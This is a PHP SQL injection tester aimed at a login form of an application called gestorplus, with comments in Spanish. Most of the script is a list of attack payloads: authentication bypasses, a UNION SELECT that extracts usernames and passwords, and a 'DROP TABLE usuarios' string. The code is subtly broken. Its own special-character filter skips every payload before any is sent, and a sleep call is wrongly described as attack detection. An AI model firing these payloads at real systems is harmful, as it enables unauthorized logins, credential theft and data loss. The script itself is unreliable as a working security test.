<?php
//Este es un script realizado para verificar vulnerabilidades en gestorplus hecho por Acnth666(Englis666)
//No me hago responsable del uso irresponsable de este script.
$form_url = 'URL_FORM';

// Inicia sesión para generar el token CSRF si aún no existe
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32)); // Generar un token CSRF aleatorio
}

$test_inputs = [
    "' OR 1=1 --", 
    "' OR 'a'='a", 
    '" OR ""="',   
    "'; DROP TABLE usuarios --", 
    "admin' --",    
    "1' OR 'x'='x", 
    "admin' UNION SELECT null, null, username, password FROM users --",
    "' OR EXISTS(SELECT * FROM users WHERE username = 'admin') --", 
];

// Iterar sobre los datos de prueba
foreach ($test_inputs as $input){
    // Validación de entrada antes de la inyección
    if (preg_match('/[^\w\s]/', $input)) {
        // Si la entrada contiene caracteres especiales sospechosos, se marca como inválida
        echo "Entrada no válida detectada: $input\n";
        continue;
    }

    $data = [
        'num_doc' => $input,
        'password' => '123456',
        'csrf_token' => $_SESSION['csrf_token'],
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $form_url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));

    $response = curl_exec($ch);

    if ($response === false) {
        echo "Error en la solicitud cURL: " . curl_error($ch) . "\n";
    }

    curl_close($ch);

    // Implementar un retraso para detectar patrones anómalos (como inyección SQL)
    if (strpos($input, "' OR") !== false || strpos($input, "'--") !== false) {
        sleep(2);  // Retraso artificial de 2 segundos para detectar posibles ataques
    }

    echo "Probando con: $input\n";
    echo "Respuesta: $response\n\n";

    // Validar la respuesta en busca de posibles vulnerabilidades SQL
    if (strpos($response, 'Error') !== false || strpos($response, 'SQL') !== false || strpos($response, 'mysqli') !== false) {
        echo "Posible vulnerabilidad detectada en: $input\n";
    }
}
?>
